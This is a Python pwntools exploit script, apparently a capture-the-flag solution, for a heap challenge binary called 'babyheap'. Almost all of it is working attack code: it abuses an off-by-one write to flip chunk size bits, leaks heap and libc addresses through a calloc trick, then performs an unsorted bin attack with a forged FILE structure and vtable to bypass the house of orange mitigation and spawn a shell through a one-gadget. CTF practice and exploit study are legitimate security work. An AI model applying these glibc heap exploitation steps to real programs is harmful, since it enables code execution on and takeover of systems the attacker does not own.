# off-by-one in update() + calloc trick + house of orange mitigation bypass

from pwn import *

def alloc(size):
	r.sendlineafter('Command: ', '1')
	r.sendlineafter('Size: ', str(size))
	return

def update(idx, size, data):
	r.sendlineafter('Command: ', '2')
	r.sendlineafter('Index: ', str(idx))
	r.sendlineafter('Size: ', str(size))
	r.sendafter('Content: ', data)
	return

def free(idx):
	r.sendlineafter('Command: ', '3')
	r.sendlineafter('Index: ', str(idx))
	return

def view(idx):
	r.sendlineafter('Command: ', '4')
	r.sendlineafter('Index: ', str(idx))
	return

def leak(idx, ru):
	view(idx)
	r.recvuntil(ru)
	return u64(r.recv(6).ljust(8, chr(0)))

def pwn():

	for i in xrange(3):
		alloc(0x58)

	free(2)
	free(1)

	# turn on the IS_MMAPPED bit field to prevent calloc from initializing the chunk with 0s
	# see https://github.com/andigena/ptmalloc-fanzine/blob/master/03-scraps/uninitialized_calloc.c
	update(0, 0x59, 'A'*0x58 + p8(0x62))

	alloc(0x58) # 1

	heap = leak(1, 'Chunk[1]: ') - 0xc0
	log.success('Heap: 0x{:x}'.format(heap))
	# bring it back to normal
	update(0, 0x59, 'A'*0x58 + p8(0x61))

	# free them all and start fresh
	free(0)
	free(1)

	# Now we will overlap an unsorted remainder chunk with an in-use chunk
	for i in xrange(10):
		alloc(0x58)
	
	update(0, 0x59, 'A'*0x58 + p8(0xc1))

	free(2)

	# overlap the remainder with chunk #3
	alloc(0x58)

	libc    = leak(3, 'Chunk[3]: ') - 0x3c1b58
	iolist  = libc + 0x3c2500
	oneshot = libc + 0xcde41
	log.success('Libc: 0x{:x}'.format(libc))

	# now we can perform unsorted bin attack by updating chunk #3
	# and bypass the house of orange mitigation
	# see http://blog.rh0gue.com/2017-12-31-34c3ctf-300/
	vtable  = libc + 0x3bdc78
	# address of chunk #3
	fake_fp = heap + 0x120 # fp->_wide_data

	chunk  = p64(0xb00bface)
	chunk += p64(iolist - 0x10)
	chunk += p64(2)
	chunk += p64(3)
	chunk += p64(0xb00bface) # fp->wide_data->buf_base

	# place fp->_wide_data at fake_fp + 0xa0
	update(4, 7*8, p64(0)*6 + p64(fake_fp))
	# place the vtable at fake_fp + 0xd8
	update(5, 4*8, p64(0xb00bface) + p64(vtable) + p64(0) + p64(oneshot))
	# set up the fake file structure
	update(3, len(chunk), chunk)

	# game over
	alloc(43)

	r.interactive()

if __name__ == "__main__":
	r = process('./babyheap')
	pause()
	pwn()
